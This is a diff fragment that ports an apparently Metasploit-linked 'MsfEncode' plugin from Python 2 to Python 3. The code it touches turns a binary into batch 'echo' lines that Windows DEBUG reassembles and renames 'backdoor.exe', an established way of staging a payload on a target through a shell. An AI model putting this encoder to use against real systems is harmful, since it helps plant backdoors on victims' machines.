@@ -32,6 +32,10 @@ from __future__ import print_function
 
 
 
+from builtins import str
+from builtins import chr
+from builtins import range
+from builtins import object
 from plugins.msf.pymetasploit.MetasploitObj import MsfObj
 from subprocess import *
 import re,binascii,os,sys,time,tempfile
@@ -121,8 +125,7 @@ class MsfEncode(object):
 		except:
 			print("Something went wrong....")
 
-		FOOTER  = ''.join(map(lambda x:"echo "+x+">>T\n",
-		["RCX","%X ","N T.BIN","WDS:0","Q"])) 
+		FOOTER  = ''.join(["echo "+x+">>T\n" for x in ["RCX","%X ","N T.BIN","WDS:0","Q"]]) 
 		FOOTER += 'DEBUG<T 1>NUL\n'
 		FOOTER += 'MOVE T.BIN backdoor.exe'
 		FC,CX = 0, fileopen.seek(0,2) or fileopen.tell()
@@ -132,7 +135,7 @@ class MsfEncode(object):
 		fileopen.seek(0,0)
 		writefile.write('DEL T 1>NUL 2>NUL\n')
 		try:
-		   for chunk in xrange(0x1000):
+		   for chunk in range(0x1000):
 		     finalwrite = fileopen.read(16) or writefile.write(FOOTER%CX) or filesize("",0)
 		     if finalwrite.count('\0')==0x10: FC += 1
 		     else:
@@ -140,7 +143,7 @@ class MsfEncode(object):
 		         writefile.write('echo FDS:%X L %X 00>>T\n'%((chunk-FC)*0x10,FC*0x10))
 		         FC = 0
 		       writefile.write('echo EDS:%X '%(chunk*0x10))
-		       writefile.write(' '.join(map(lambda x:"%02X"%ord(x),finalwrite))+'>>T\n')
+		       writefile.write(' '.join(["%02X"%ord(x) for x in finalwrite])+'>>T\n')
 		except Exception:
 		       pass
 		writefile.close()
